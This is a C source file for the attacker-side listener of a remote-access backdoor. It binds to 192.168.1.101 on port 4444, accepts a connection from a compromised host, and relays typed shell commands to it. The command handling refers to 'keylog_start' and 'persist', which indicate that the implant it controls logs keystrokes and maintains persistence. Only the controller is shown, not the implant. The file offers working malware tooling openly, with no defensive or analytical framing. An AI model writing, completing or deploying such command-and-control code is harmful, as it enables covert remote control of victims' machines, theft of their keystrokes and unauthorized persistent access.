#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024
#define RESPONSE_SIZE 18384

int main()
{
    int sock, client_socket;
    char buffer[BUFFER_SIZE];
    char response[RESPONSE_SIZE];
    struct sockaddr_in server_address, client_address;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        perror("setsockopt");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.1.101");
    server_address.sin_port = htons(4444);

    if (bind(sock, (struct sockaddr *)&server_address, sizeof(server_address)) < 0)
    {
        perror("bind");
        return 1;
    }

    if (listen(sock, 5) < 0)
    {
        perror("listen");
        return 1;
    }

    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);

    while (1)
    {
    jump:
        printf("$ Shell: %s ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");

        write(client_socket, buffer, sizeof(buffer));

        if (strncmp("q", buffer, 1) == 0)
        {
            break;
        }
        // cmds
        else if (strncmp("cd ", buffer, 3) == 0 || strncmp("keylog_start", buffer, 12) == 0)
        {
            goto jump;
        }
        else if (strncmp("persist", buffer, 7) == 0)
        {
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response);
        }
        else
        {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }

    close(client_socket);
    close(sock);

    return 0;
}

